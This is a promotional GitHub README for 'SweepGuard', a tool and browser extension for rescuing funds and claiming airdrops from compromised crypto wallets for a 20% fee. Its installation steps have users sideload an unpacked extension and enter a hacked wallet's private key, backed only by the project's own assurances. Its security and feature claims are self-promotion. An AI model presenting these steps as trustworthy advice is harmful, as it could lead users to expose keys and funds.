# 🛡️ SweepGuard — Protect Compromised Crypto Wallets

> Auto-sweep protection for compromised EVM wallets. Claim airdrops, recover funds, and revoke drainer delegations — all while keeping your funds safe.

**Live:** [sweeptsguard.vercel.app](https://sweeptsguard.vercel.app) · **Extension:** [Download v2.0](https://github.com/kabla1696-ctrl/sweeptsguard/releases) · **Blog:** [sweeptsguard.vercel.app/blog](https://sweeptsguard.vercel.app/blog)

---

## 🚨 What is SweepGuard?

If your wallet has been compromised by a drainer (EIP-7702, approval exploit, private key leak), **SweepGuard** helps you:

1. **Claim airdrops safely** — 80% to your safe wallet, 20% platform fee
2. **Revoke drainer delegations** — Remove EIP-7702 delegations across 33 chains
3. **Track stolen funds** — See where your funds went
4. **Auto-sweep incoming funds** — Instantly forward any new funds to your safe wallet
5. **Rescue via browser extension** — Private key stays local, sponsor pays gas

---

## 🧩 Browser Extension v2.0

Download the extension to claim airdrops and rescue funds directly from your browser.

### Features
- 🔑 **Hacked wallet private key** — input (masked, never sent to server)
- 💰 **Safe wallet address** — where rescued funds go
- ⛽ **Sponsor wallet** — pays gas fees
- 🎯 **Airdrop claim** — preview → claim flow
- 🛡️ **Drainer detection** — blocks known drainer contracts
- ⚠️ **Phishing protection** — warns on phishing sites
- 🔍 **TX simulation** — preview before signing

### Active Chain
- ✅ **Base** — SweepGuardRescuer deployed at `0xDB671f97bfB72e324A758588456373EEC141400F`
- 🔒 Ethereum, Arbitrum, Optimism, Polygon, BNB, +10 more — **Coming Soon**

### Installation
1. Download from [Releases](https://github.com/kabla1696-ctrl/sweeptsguard/releases)
2. Extract the ZIP file
3. Open `chrome://extensions` → Enable Developer mode
4. Click "Load unpacked" → Select extracted folder
5. SweepGuard icon appears in toolbar ✅

---

## 🎯 Airdrop Claimer — How It Works

```
┌─────────────────────────────────────────────────────────┐
│  STEP 1: PREVIEW                                        │
│  Enter airdrop contract → System detects token,         │
│  eligibility, amount, and gas cost                      │
├─────────────────────────────────────────────────────────┤
│  STEP 2: SIGN                                           │
│  MetaMask popup → Sign EIP-712 message                  │
│  (NOT a transaction — your key stays in browser)        │
├─────────────────────────────────────────────────────────┤
│  STEP 3: EXECUTE                                        │
│  Sponsor wallet pays gas → Smart contract claims        │
│  tokens → 80% to safe wallet, 20% platform fee          │
│  (All in ONE atomic transaction)                        │
└─────────────────────────────────────────────────────────┘
```

### Execution Strategies
| Chain | Method | Safety |
|-------|--------|--------|
| Ethereum | Flashbots atomic bundle | 🟢 Safe (no public mempool) |
| Base, Arbitrum, Optimism, zkSync, Linea, Scroll, Blast, +10 L2s | Rapid-fire sequential TX | 🟢 Safe (private sequencer) |
| BNB Chain, Polygon | Protected RPC (bloXroute/Polygon private) | 🟡 Medium risk |
| Other public mempool chains | Rapid-fire (public mempool) | 🔴 High risk |

### Platform Fee
- **20% platform fee** on claimed airdrops
- **Referral commission:** 5% of platform fee (1% of total claim)
- **You receive:** 80% of claim to your safe wallet

---

## 🛡️ Security Features

### 75+ Pages, 280+ Files
- **Security Suite:** Scan, Audit Bot, Scam Check, Approvals, Risk Heatmap
- **Monitoring:** Dashboard, AI Threat Intel, Whale Alerts, Drainer Map
- **Recovery:** Fund recovery, Freeze requests, Social Recovery, Multi-sig
- **Tools:** Portfolio, Cross-chain, DeFi Protector, Gas Optimizer
- **Extension:** Chrome/Brave/Edge Manifest V3 extension

### Smart Contract Security
- EIP-712 typed signatures (not raw `personal_sign`)
- Atomic transactions (claim + transfer in one TX)
- Contract validation (bytecode check, honeypot detection)
- Simulation before execution
- Sponsor wallet never exposed to blockchain

### Admin Dashboard
- Wallet signature authentication (`personal_sign`)
- 5-minute session expiry
- Rate limiting on all admin endpoints
- CORS protection

---

## 🏗️ Tech Stack

- **Frontend:** Next.js 16, React 19, Tailwind CSS 4
- **Blockchain:** ethers.js 6, 33+ EVM chains
- **Smart Contracts:** Solidity 0.8.20, EIP-7702
- **Extension:** Manifest V3 (Chrome/Brave/Edge)
- **Deployment:** Vercel (auto-deploy on push)
- **SEO:** Dynamic sitemap, JSON-LD, OpenGraph, Twitter Cards

---

## 📊 Stats

| Metric | Value |
|--------|-------|
| Pages | 75+ |
| API Routes | 60+ |
| EVM Chains | 33+ |
| Smart Contracts | SweepGuardClaimer, SweepGuardRescuer |
| Extension Size | ~23 KB |
| Admin Dashboard | Real-time analytics + referrals |

---

## 🔧 Development

```bash
# Clone
git clone https://github.com/kabla1696-ctrl/sweeptsguard.git
cd sweeptsguard

# Install
npm install

# Dev server
npm run dev

# Build
npm run build

# Tests
npm test

# Build extension ZIP
node build-extension.js
```

---

## 📚 Documentation

- [sweeptsguard.vercel.app/docs](https://sweeptsguard.vercel.app/docs)
- [Blog](https://sweeptsguard.vercel.app/blog) — Crypto security guides
- [API Docs](https://sweeptsguard.vercel.app/api-docs)

---

## 🔗 Links

- **Website:** [sweeptsguard.vercel.app](https://sweeptsguard.vercel.app)
- **Twitter:** [@SweepGuard_io](https://x.com/SweepGuard_io)
- **GitHub:** [kabla1696-ctrl/sweeptsguard](https://github.com/kabla1696-ctrl/sweeptsguard)
- **Extension:** [Download v2.0](https://github.com/kabla1696-ctrl/sweeptsguard/releases)

---

## 📄 License

MIT License — Open Source

---

Built with 🛡️ to protect your crypto.
